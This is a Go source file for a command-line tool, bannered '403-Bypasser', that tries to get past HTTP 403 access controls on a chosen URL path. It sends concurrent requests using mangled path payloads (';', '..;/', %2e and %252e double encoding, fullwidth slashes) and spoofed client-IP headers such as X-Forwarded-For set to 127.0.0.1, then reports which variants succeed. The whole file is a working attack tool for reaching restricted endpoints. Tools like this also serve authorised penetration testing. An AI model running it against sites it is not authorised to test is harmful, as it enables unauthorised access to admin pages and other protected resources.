package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	reURL          = regexp.MustCompile("^https?://")
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Remote-IP",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-ProxyUser-Ip",
		"X-Remote-Addr",
	}
)

const (
	version string = "v1.0.2"
	red     string = "\033[31m"
	green   string = "\033[32m"
	white   string = "\033[97m"

	headerValue string = "127.0.0.1"
)

func showBanner() {
	fmt.Printf("%s %s %s %s %s %s %s %s %s %s %s\n", green,
		" _  _    ___ ____        ____\n",
		"| || |  / _ \\___ \\      |  _ \\\n",
		"| || |_| | | |__) |_____| |_) |_   _ _ __   __ _ ___ ___  ___ _ __\n",
		"|__   _| | | |__ <______|  _ <| | | | '_ \\ / _` / __/ __|/ _ \\ '__|\n",
		"   | | | |_| |__) |     | |_) | |_| | |_) | (_| \\__ \\__ \\  __/ |\n",
		"   |_|  \\___/____/      |____/ \\__, | .__/ \\__,_|___/___/\\___|_|\n",
		"                                __/ | |\n",
		"                               |___/|_|                          ",
		version, white)
}

func getValidDomain(domain string) string {
	trimmedDomain := strings.TrimSpace(domain)

	if !reURL.MatchString(trimmedDomain) {
		trimmedDomain = "https://" + trimmedDomain
	}

	return trimmedDomain
}

func constructEndpointPayloads(domain, path string) []string {
	return []string{
		domain + "/" + strings.ToUpper(path),
		domain + "/" + path + "/",
		domain + "/" + path + "/.",
		domain + "//" + path + "//",
		domain + "/./" + path + "/./",
		domain + "/./" + path + "/..",
		domain + "/;/" + path,
		domain + "/.;/" + path,
		domain + "//;//" + path,
		domain + "/" + path + "..;/",
		domain + "/%2e/" + path,
		domain + "/%252e/" + path,
		domain + "/%ef%bc%8f" + path,
	}
}

func penetrateEndpoint(wg *sync.WaitGroup, url string, header ...string) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		log.Fatal(err)
	}

	var h string
	if header != nil {
		h = header[0]
		req.Header.Set(h, headerValue)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	color := green
	if resp.StatusCode != 200 {
		color = red
	}

	log.Println(color, h, url, resp.StatusCode, http.StatusText(resp.StatusCode), white)
}

func main() {
	runtime.GOMAXPROCS(1)

	domain := flag.String("url", "", "A domain with the protocol. Example: https://daffa.tech")
	path := flag.String("path", "", "An endpoint. Example: admin")
	flag.Parse()

	if *domain == "" || *path == "" {
		log.Fatalln("Using flag -url and -path")
	}

	validDomain := getValidDomain(*domain)
	validPath := strings.TrimSpace(*path)
	endpoints := constructEndpointPayloads(validDomain, validPath)

	showBanner()

	fmt.Println("\nDomain:", validDomain)
	fmt.Println("Path:", validPath)

	fmt.Println("\nNormal Request")

	var wg sync.WaitGroup
	wg.Add(len(endpoints))

	for _, e := range endpoints {
		go penetrateEndpoint(&wg, e)
	}

	wg.Wait()

	fmt.Println("\nRequest with Headers")
	wg.Add(len(headerPayloads))

	for _, h := range headerPayloads {
		go penetrateEndpoint(&wg, validDomain+"/"+validPath, h)
	}

	wg.Wait()
}
